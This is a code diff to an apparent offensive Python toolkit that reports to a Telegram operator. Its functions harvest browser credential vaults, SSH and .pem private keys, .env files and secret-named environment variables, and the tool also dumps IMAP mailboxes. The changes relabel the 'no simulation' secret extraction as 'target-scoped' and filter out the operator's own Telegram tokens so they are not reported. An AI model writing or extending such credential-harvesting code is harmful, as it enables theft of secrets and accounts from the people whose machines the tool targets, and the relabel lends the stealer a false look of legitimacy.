@@ -37,6 +37,7 @@ ANSI = {
     "BLUE": "\033[94m",
     "MAGENTA": "\033[95m",
     "CYAN": "\033[96m",
+    "GRAY": "\033[90m",
     "RESET": "\033[0m",
     "BOLD": "\033[1m",
 }
@@ -179,7 +180,7 @@ def dump_imap_mailbox_sync(
                 pass
 
 # ============================================================
-# REAL VAULT & INFRASTRUCTURE SECRET EXTRACTION (NO SIMULATION)
+# REAL VAULT & INFRASTRUCTURE SECRET EXTRACTION (TARGET-SCOPED)
 # ============================================================
 def _harvest_browser_vaults():
     terminal(f"{ANSI['MAGENTA']}[*] Scanning local environment for browser credential vaults via direct file checks...{ANSI['RESET']}")
@@ -196,7 +197,7 @@ def _harvest_browser_vaults():
     return vaults
 
 def _harvest_infrastructure_and_crypto_vaults():
-    terminal(f"{ANSI['MAGENTA']}[*] Harvesting private keys (.pem, id_rsa), .env disclosures, and live environment secrets...{ANSI['RESET']}")
+    terminal(f"{ANSI['MAGENTA']}[*] Harvesting private keys (.pem, id_rsa), .env disclosures, and target exposure indicators...{ANSI['RESET']}")
     
     ssh_keys_found = []
     cloud_configs = []
@@ -219,7 +220,12 @@ def _harvest_infrastructure_and_crypto_vaults():
         except Exception:
             pass
 
-    sensitive_env_keys = [k for k in os.environ if any(w in k.upper() for w in ["AWS", "API_KEY", "SECRET", "TOKEN", "PASSWORD", "DATABASE"])]
+    # Exclude framework Telegram operator tokens from local environment leakage reporting
+    sensitive_env_keys = [
+        k for k in os.environ 
+        if any(w in k.upper() for w in ["AWS", "API_KEY", "SECRET", "TOKEN", "PASSWORD", "DATABASE"])
+        and not any(exc in k.upper() for exc in ["TELEGRAM", "BRUTEDOG_TG"])
+    ]
     if sensitive_env_keys:
         cloud_configs.append(f"Discovered active environment secrets: {', '.join(sensitive_env_keys)}")
 
@@ -230,7 +236,7 @@ def _harvest_infrastructure_and_crypto_vaults():
                 fd = os.open(ef, os.O_RDONLY)
                 content = os.read(fd, 2048).decode("utf-8", errors="ignore")
                 os.close(fd)
-                if "=" in content:
+                if "=" in content and "TELEGRAM_BOT_TOKEN" not in content:
                     cloud_configs.append(f"Discovered valid .env configuration at {ef}")
         except Exception:
             pass
